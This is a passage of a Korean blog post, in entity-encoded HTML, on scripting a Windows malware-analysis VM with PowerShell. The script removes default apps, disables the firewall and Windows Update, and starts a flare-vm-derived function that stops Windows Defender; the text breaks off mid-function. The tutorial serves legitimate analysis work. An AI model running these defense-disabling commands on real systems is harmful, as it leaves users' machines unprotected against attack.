&#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x1F602;)</p><p>&#xBCF8;&#xB798; SSG &#xB3D9;&#xC544;&#xB9AC; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xAD00;&#xB828; &#xC2A4;&#xD130;&#xB514; &#xB4F1;&#xC744; &#xD560; &#xB54C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC8FC;&#xBA74;&#xC11C; &#xC774;&#xAC70; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xB420; &#xAC70;&#xC57C;~ &#xD588;&#xB294;&#xB370; &#xADF8;&#xAC78; &#xADF8;&#xB300;&#xB85C; &#xBE14;&#xB85C;&#xADF8;&#xC5D0; &#xC62C;&#xB9AC;&#xAE30;&#xC5D0;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xB108;&#xBB34; &#xCC98;&#xCC38;&#xD574;&#xC11C;&#x2026; (&#xB9E4;&#xC6B0; &#xB354;&#xB7FD;&#xC2B5;&#xB2C8;&#xB2E4;.) &#xC774;&#xBC88; &#xAE30;&#xD68C;&#xC5D0; &#xAE54;&#xB054;&#xD558;&#xAC8C; &#xC791;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xBB3C;&#xB860; &#xC81C; &#xAE30;&#xC900;&#xC5D0;&#xC11C;&#xB9CC; &#xAE54;&#xB054;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC5B4;&#xC694;! &#xC591;&#xD574; &#xBC14;&#xB78D;&#xB2C8;&#xB2E4;. &#x1F642;   </p><p>&#xD30C;&#xD2B8;&#xB294; &#xD06C;&#xAC8C; &#xB450; &#xAC00;&#xC9C0;&#xB85C; &#xB098;&#xB260; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xCCAB; &#xBC88;&#xC9F8; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; Windows &#xC124;&#xC815;&#xC5D0; &#xB300;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD560; &#xC608;&#xC815;&#xC774;&#xACE0;, &#xB450; &#xBC88;&#xC9F8; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; <a href="https://chocolatey.org/">chocolatey</a>&#xB97C; &#xD65C;&#xC6A9;&#xD55C; &#xD234;&#xB4E4;&#xC744; &#xC124;&#xCE58;&#xD560; &#xAC81;&#xB2C8;&#xB2E4;!</p><h1 id="&#xBB34;&#xC5C7;&#xC744;-&#xC124;&#xC815;&#xD574;&#xC57C;-&#xD560;&#xAE4C;"><a href="#&#xBB34;&#xC5C7;&#xC744;-&#xC124;&#xC815;&#xD574;&#xC57C;-&#xD560;&#xAE4C;" class="headerlink" title="&#xBB34;&#xC5C7;&#xC744; &#xC124;&#xC815;&#xD574;&#xC57C; &#xD560;&#xAE4C;?"></a>&#xBB34;&#xC5C7;&#xC744; &#xC124;&#xC815;&#xD574;&#xC57C; &#xD560;&#xAE4C;?</h1><p>&#xAC00;&#xC7A5; &#xBA3C;&#xC800; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xBB34;&#xC5C7;&#xC744; &#xD574;&#xC57C; &#xD560;&#xC9C0; &#xC815;&#xB9AC;&#xB97C; &#xD558;&#xACE0; &#xC2DC;&#xC791;&#xD569;&#xC2DC;&#xB2E4;. &#xC544;&#xBB34;&#xB798;&#xB3C4; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xC57C; &#xD558;&#xBBC0;&#xB85C; Windows Defender&#xC640; Windows Update&#xB294; &#xAEBC;&#xB193;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xACA0;&#xC8E0;? &#xC2DC;&#xC791; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xB4F1;&#xB85D;&#xB418;&#xC5C8;&#xC744; &#xB54C; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC2DC;&#xC791; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xB3C4; &#xC815;&#xB9AC;&#xD558;&#xACE0;&#x2026; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xAE30;&#xBCF8; &#xC571; &#xC0AD;&#xC81C; &#xB4F1;&#x2026; &#xC81C;&#xAC00; &#xC0DD;&#xAC01;&#xB098;&#xB294; &#xB300;&#xB85C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xAE30;&#xBCF8; &#xC571; &#xC0AD;&#xC81C;</li><li>&#xBC29;&#xD654;&#xBCBD; &#xBE44;&#xD65C;&#xC131;&#xD654;</li><li>Windows Update &#xBE44;&#xD65C;&#xC131;&#xD654;</li><li>Windows Defender &#xBE44;&#xD65C;&#xC131;&#xD654;</li><li>&#xBCF4;&#xC548;&#xC720;&#xC9C0; &#xC815;&#xCC45; &#xC54C;&#xB9BC; &#xBE44;&#xD65C;&#xC131;&#xD654;</li><li>&#xC791;&#xC5C5; &#xC2A4;&#xCF00;&#xC904;&#xB7EC; &#xC0AD;&#xC81C;</li><li>&#xC2DC;&#xC791; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC0AD;&#xC81C;</li><li>&#xC228;&#xAE40; &#xD30C;&#xC77C; &#xD45C;&#xC2DC;</li></ol><p>Windows&#xC5D0;&#xC11C; &#xC258; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB85C; &#xD55C; &#xBC88;&#xC5D0; &#xC124;&#xC815;&#xC744; &#xD55C;&#xB2E4;&#xACE0;? &#xBB54;&#xAC00; &#xB0AF;&#xC124;&#xAC8C; &#xB290;&#xAEF4;&#xC9C0;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xB3C4; &#xACC4;&#xC2DC;&#xACA0;&#xC9C0;&#xB9CC; Windows&#xC5D0;&#xB294; Powershell&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. Powershell&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xC704;&#xC758; &#xC791;&#xC5C5;&#xB4E4;&#xC744; &#xD558;&#xB098;&#xD558;&#xB098; &#xC9C4;&#xD589;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!</p><h1 id="&#xC0AC;&#xC6A9;&#xD558;&#xC9C0;-&#xC54A;&#xB294;-&#xAE30;&#xBCF8;-&#xC571;-&#xC0AD;&#xC81C;"><a href="#&#xC0AC;&#xC6A9;&#xD558;&#xC9C0;-&#xC54A;&#xB294;-&#xAE30;&#xBCF8;-&#xC571;-&#xC0AD;&#xC81C;" class="headerlink" title="&#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xAE30;&#xBCF8; &#xC571; &#xC0AD;&#xC81C;"></a>&#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xAE30;&#xBCF8; &#xC571; &#xC0AD;&#xC81C;</h1><p>&#xCC98;&#xC74C; Windows&#xB97C; &#xC124;&#xCE58;&#xD558;&#xBA74; 3D &#xBDF0;&#xC5B4;&#xB098;, BingFinance, OfficeHub &#xB4F1;&#xB4F1; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC5D0;&#xB294; &#xD65C;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xB4E4;&#xC774; &#xB9CE;&#xC774; &#xC124;&#xCE58;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC571;&#xC744; &#xC190;&#xC218; &#xC9C0;&#xC6B8; &#xC218;&#xB3C4; &#xC788;&#xC73C;&#xB098; <code>Remove-AppxPackage</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC0AD;&#xC81C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">Get-AppxPackage</span> Microsoft.XboxAppName              : Microsoft.XboxAppPublisher         : CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=USArchitecture      : X64ResourceId        :Version           : <span class="hljs-number">48.76</span>.<span class="hljs-number">8001.0</span>PackageFullName   : Microsoft.XboxApp_48.<span class="hljs-number">76.8001</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbweInstallLocation   : C:\Program Files\WindowsApps\Microsoft.XboxApp_48.<span class="hljs-number">76.8001</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbweIsFramework       : FalsePackageFamilyName : Microsoft.XboxApp_8wekyb3d8bbwePublisherId       : <span class="hljs-number">8</span>wekyb3d8bbweIsResourcePackage : FalseIsBundle          : FalseIsDevelopmentMode : FalseNonRemovable      : FalseDependencies      : {Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>_1.<span class="hljs-number">7.27413</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>_1.<span class="hljs-number">7.27422</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.VCLibs.<span class="hljs-number">140.00</span>_14.<span class="hljs-number">0.29231</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktop_14.<span class="hljs-number">0.29231</span>.<span class="hljs-number">0</span>_x64__8wekyb3                    d8bbwe...}IsPartiallyStaged : FalseSignatureKind     : StoreStatus            : Ok</code></pre><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; XboxApp&#xC758; &#xACBD;&#xC6B0; &#xBD84;&#xC11D;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xC608; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACA0;&#xC8E0;? <code>Get-AppxPackage</code>&#xB97C; &#xD1B5;&#xD574; &#xD328;&#xD0A4;&#xC9C0;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xACE0;, &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC73C;&#xB85C; <code>Remove-AppxPackage</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xD328;&#xD0A4;&#xC9C0;&#xAC00; &#xC0AD;&#xC81C;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xD1A0;&#xB300;&#xB85C; &#xC791;&#xC131;&#xD55C; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(    <span class="hljs-string">&quot;7EE7776C.LinkedInforWindows&quot;</span>    <span class="hljs-string">&quot;C27EB4BA.DropboxOEM&quot;</span>    <span class="hljs-string">&quot;Microsoft.3DBuilder&quot;</span>    <span class="hljs-string">&quot;Microsoft.Microsoft3DViewer&quot;</span>    <span class="hljs-string">&quot;Microsoft.Advertising.Xaml&quot;</span>    <span class="hljs-string">&quot;Microsoft.Appconnector&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingFinance&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingFoodAndDrink&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingHealthAndFitness&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingNews&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingSports&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingTravel&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingWeather&quot;</span>    <span class="hljs-string">&quot;Microsoft.CommsPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.ConnectivityStore&quot;</span>    <span class="hljs-string">&quot;Microsoft.DesktopAppInstaller&quot;</span>    <span class="hljs-string">&quot;Microsoft.Getstarted&quot;</span>    <span class="hljs-string">&quot;Microsoft.Messaging&quot;</span>    <span class="hljs-string">&quot;Microsoft.Microsoft3DViewer&quot;</span>    <span class="hljs-string">&quot;Microsoft.MicrosoftOfficeHub&quot;</span>    <span class="hljs-string">&quot;Microsoft.MicrosoftSolitaireCollection&quot;</span>    <span class="hljs-string">&quot;Microsoft.MixedReality.Portal&quot;</span>    <span class="hljs-string">&quot;Microsoft.Netflix&quot;</span>    <span class="hljs-string">&quot;Microsoft.NetworkSpeedTest&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.Desktop&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.OneNote&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.Sway&quot;</span>    <span class="hljs-string">&quot;Microsoft.OfficeLens&quot;</span>    <span class="hljs-string">&quot;Microsoft.OneConnect&quot;</span>    <span class="hljs-string">&quot;Microsoft.OneDrive&quot;</span>    <span class="hljs-string">&quot;Microsoft.People&quot;</span>    <span class="hljs-string">&quot;Microsoft.Print3D&quot;</span>    <span class="hljs-string">&quot;Microsoft.RemoteDesktop&quot;</span>    <span class="hljs-string">&quot;Microsoft.SkypeApp&quot;</span>    <span class="hljs-string">&quot;Microsoft.Wallet&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.CloudExperienceHost&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.NarratorQuickStart&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.PeopleExperienceHost&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.Photos&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsAlarms&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsCamera&quot;</span>    <span class="hljs-string">&quot;Microsoft.windowscommunicationsapps&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsFeedbackHub&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsMaps&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsReadingList&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsSoundRecorder&quot;</span>    <span class="hljs-string">&quot;Microsoft.Xbox.TCUI&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxApp&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGameCallableUI&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGameOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGamingOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxIdentityProvider&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxLive&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxSpeechToTextOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.YourPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.ZuneMusic&quot;</span>    <span class="hljs-string">&quot;Microsoft.ZuneVideo&quot;</span>    <span class="hljs-string">&quot;Windows.CBSPreview&quot;</span>)<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$name</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>){    <span class="hljs-built_in">Get-AppxPackage</span> <span class="hljs-variable">$name</span> | <span class="hljs-built_in">Remove-AppxPackage</span>}</code></pre><p><code>$packages</code>&#xC5D0; &#xC788;&#xB294; &#xD328;&#xD0A4;&#xC9C0; &#xC774;&#xB984;&#xC744; &#xD558;&#xB098;&#xC529; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xC0AD;&#xC81C;&#xB97C; &#xD558;&#xB294; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC740; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD639;&#xC2DC; &#xBCF8;&#xC778;&#xC774; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xC2F6;&#xC9C0; &#xC54A;&#xAC70;&#xB098; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xCD94;&#xAC00;&#xB97C; &#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled.png" alt></p><p>&#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xC571;&#xC774; &#xC788;&#xB294;&#xB370; &#xD328;&#xD0A4;&#xC9C0; &#xC774;&#xB984;&#xC744; &#xBAA8;&#xB974;&#xC2DC;&#xACA0;&#xB2E4;&#xACE0;&#xC694;? &#xAC71;&#xC815;&#xD558;&#xC9C0; &#xB9C8;&#xC138;&#xC694;! &#xAE54;&#xB824;&#xC788;&#xB294; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xC815;&#xB82C;&#xD574;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">Get-AppxPackage</span> | <span class="hljs-built_in">Select</span> NameName----windows.immersivecontrolpanelMicrosoft.VCLibs.<span class="hljs-number">140.00</span>Microsoft.UI.Xaml.<span class="hljs-number">2.0</span>Windows.PrintDialogMicrosoft.WalletMicrosoft.VCLibs.<span class="hljs-number">140.00</span>Microsoft.VCLibs.<span class="hljs-number">140.00</span>RealtekSemiconductorCorp.RealtekAudioControlMicrosoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktopMicrosoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktopAdvancedMicroDevicesInc<span class="hljs-literal">-2</span>.AMDRadeonSoftwareMicrosoft.XboxSpeechToTextOverlayMicrosoft.XboxGameOverlayMicrosoft.NET.Native.Runtime.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Framework.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Framework.<span class="hljs-number">2.2</span>Microsoft.Xbox.TCUIMicrosoft.UI.Xaml.<span class="hljs-number">2.4</span>Microsoft.UI.Xaml.<span class="hljs-number">2.4</span>Microsoft.UI.Xaml.<span class="hljs-number">2.0</span>Microsoft.UI.Xaml.<span class="hljs-number">2.1</span>Microsoft.UI.Xaml.<span class="hljs-number">2.1</span>Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>Microsoft.UI.Xaml.<span class="hljs-number">2.3</span>Microsoft.UI.Xaml.<span class="hljs-number">2.3</span>Microsoft.UI.Xaml.<span class="hljs-number">2.5</span>Microsoft.UI.Xaml.<span class="hljs-number">2.5</span>Microsoft.<span class="hljs-number">549981</span>C3F5F10Microsoft.StorePurchaseAppMicrosoft.LanguageExperiencePackko<span class="hljs-literal">-KR</span>Microsoft.WinDbgmicrosoft.windowscommunicationsappsMicrosoft.WebpImageExtensionMicrosoft.XboxIdentityProviderMicrosoft.DesktopAppInstallerMicrosoft.Windows.PhotosMicrosoft.WebMediaExtensionsMicrosoft.XboxAppMicrosoft.MixedReality.PortalMicrosoft.PeopleMicrosoft.WindowsStoreMicrosoft.ZuneVideoMicrosoft.Microsoft3DViewerMicrosoft.WindowsFeedbackHubMicrosoft.MicrosoftStickyNotesMicrosoft.WindowsAlarmsMicrosoft.GetHelpMicrosoft.BingWeatherMicrosoft.WindowsCameraMicrosoft.ScreenSketchMicrosoft.WindowsMapsMicrosoft.WindowsCalculatorMicrosoft.WindowsSoundRecorderMicrosoft.ZuneMusicMicrosoft.BioEnrollmentMicrosoft.Windows.CloudExperienceHostMicrosoft.Windows.OOBENetworkConnectionFlowMicrosoft.AAD.BrokerPluginMicrosoft.Windows.OOBENetworkCaptivePortalMicrosoftWindows.UndockedDevKitMicrosoft.Windows.StartMenuExperienceHostMicrosoft.Windows.ShellExperienceHostMicrosoft.Windows.SearchMicrosoft.MicrosoftEdgeMicrosoft.Windows.ContentDeliveryManagerMicrosoftWindows.Client.CBSWindows.CBSPreviewNcsiUwpAppMicrosoft.XboxGameCallableUIMicrosoft.Windows.XGpuEjectDialogMicrosoft.Windows.SecureAssessmentBrowserMicrosoft.Windows.SecHealthUIMicrosoft.Windows.PinningConfirmationDialogMicrosoft.Windows.PeopleExperienceHostMicrosoft.Windows.ParentalControlsMicrosoft.Windows.NarratorQuickStartMicrosoft.Windows.CapturePickerMicrosoft.Windows.CallingShellAppMicrosoft.Windows.AssignedAccessLockAppMicrosoft.Windows.Apprep.ChxAppMicrosoft.Win32WebViewHostMicrosoft.MicrosoftEdgeDevToolsClientMicrosoft.LockAppMicrosoft.ECAppMicrosoft.CredDialogHostMicrosoft.AsyncTextServiceMicrosoft.AccountsControlMicrosoft.VP9VideoExtensionsMicrosoft.XboxGamingOverlayMicrosoft.HEIFImageExtensionMicrosoft.MSPaint<span class="hljs-number">91750</span>D7E.SlackMicrosoft.MicrosoftEdge.StableMicrosoft.GetstartedMicrosoft.YourPhone</code></pre><p>&#xC774;&#xB984;&#xC744; &#xCC3E;&#xC558;&#xB294;&#xB370; <code>Xbox</code>&#xCC98;&#xB7FC; &#xC5EC;&#xB7EC; &#xAC1C;&#xAC00; &#xC788;&#xB294;&#xB370; &#xC801;&#xAE30;&#xAC00; &#xB108;&#xBB34; &#xADC0;&#xCC2E;&#xB2E4;. &#xB098;&#xB294; &#xD55C; &#xBC88;&#xC5D0; &#xD574;&#xCE58;&#xC6B0;&#xACE0; &#xC2F6;&#xB2E4;! &#xD558;&#xC2DC;&#xB294; &#xBD84;&#xC740; <code>Microsoft.Xbox*</code>&#xD558;&#xC2DC;&#xBA74; &#xB9AC;&#xB205;&#xC2A4;&#xC640; &#xAC19;&#xC774; <code>Microsoft.Xbox1</code> &#xB4F1; &#xB4A4;&#xC5D0; &#xCD94;&#xAC00;&#xB418;&#xC5B4; &#xC788;&#xB294;(?) &#xBB50;&#xB77C; &#xB9D0;&#xD574;&#xC57C; &#xD558;&#xC9C0;&#x2026; &#xC0DD;&#xAC01;&#xC774; &#xC548; &#xB098;&#xB124;&#xC694;! &#xC544;&#xBB34;&#xD2BC;! &#xC800; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xCE5C;&#xAD6C;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xC0AD;&#xC81C;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;!</p><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xBC29;&#xD654;&#xBCBD;&#xC744; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD558;&#xB7EC; &#xAC00;&#xBCFC;&#xAE4C;&#xC694;?</p><h1 id="&#xBC29;&#xD654;&#xBCBD;-&#xBE44;&#xD65C;&#xC131;&#xD654;"><a href="#&#xBC29;&#xD654;&#xBCBD;-&#xBE44;&#xD65C;&#xC131;&#xD654;" class="headerlink" title="&#xBC29;&#xD654;&#xBCBD; &#xBE44;&#xD65C;&#xC131;&#xD654;"></a>&#xBC29;&#xD654;&#xBCBD; &#xBE44;&#xD65C;&#xC131;&#xD654;</h1><p>&#xBC29;&#xD654;&#xBCBD; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB294; &#xAD49;&#xC7A5;&#xD788;<del>~</del>~ &#xCF54;&#xB4DC;&#xAC00; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB3C4;&#xBA54;&#xC778;, &#xACF5;&#xC6A9;, &#xAC1C;&#xC778;&#xC5D0; &#xB300;&#xD55C; &#xBC29;&#xD654;&#xBCBD; &#xBAA8;&#xB450;&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD558;&#xBA74; &#xB418;&#xB294;&#xB370; &#xC694;&#xAC70;&#xB294; PowerShell&#xC744; &#xD1B5;&#xD574; &#xD55C;&#xBC88;&#xC5D0; &#xC791;&#xC5C5;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. XD</p><pre><code class="hljs powershell"><span class="hljs-built_in">Set-NetFirewallProfile</span> <span class="hljs-literal">-Profile</span> Domain, Public, Private <span class="hljs-literal">-Enabled</span> False</code></pre><h1 id="Windows-Update-&#xBE44;&#xD65C;&#xC131;&#xD654;"><a href="#Windows-Update-&#xBE44;&#xD65C;&#xC131;&#xD654;" class="headerlink" title="Windows Update &#xBE44;&#xD65C;&#xC131;&#xD654;"></a>Windows Update &#xBE44;&#xD65C;&#xC131;&#xD654;</h1><p>Windows Update&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; WindowsUpdate &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xC5D0; <code>NoAutoUpdate</code>&#xB97C; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;WindowsUpdate&quot;</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;AU&quot;</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;NoAutoUpdate&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><h1 id="Windows-Defender-&#xBE44;&#xD65C;&#xC131;&#xD654;"><a href="#Windows-Defender-&#xBE44;&#xD65C;&#xC131;&#xD654;" class="headerlink" title="Windows Defender &#xBE44;&#xD65C;&#xC131;&#xD654;"></a>Windows Defender &#xBE44;&#xD65C;&#xC131;&#xD654;</h1><p>&#xBC29;&#xD654;&#xBCBD; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB294; Windows Defender &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xC5D0; <code>DisableAntiSpyware</code>&#xB9CC; &#xCD94;&#xAC00;&#xB97C; &#xD574;&#xB193;&#xC558;&#xC5C8;&#xB294;&#xB370;, flare-vm&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xAC00;&#xC838;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">disable_defender</span><span class="hljs-params">()</span></span>{    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Disable Windows Defender&quot;</span>    <span class="hljs-keyword">try</span>    {        <span class="hljs-built_in">Get-Service</span> WinDefend | <span class="hljs-built_in">Stop-Service</span> <span class="hljs-literal">-Force</span>        <span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Start&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">4</span> <span class="hljs-literal">-Type</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    }    <span class="hljs-keyword">catch</span>    {        <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Failed disable WinDefend Service&quot;</span>    }    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Windows 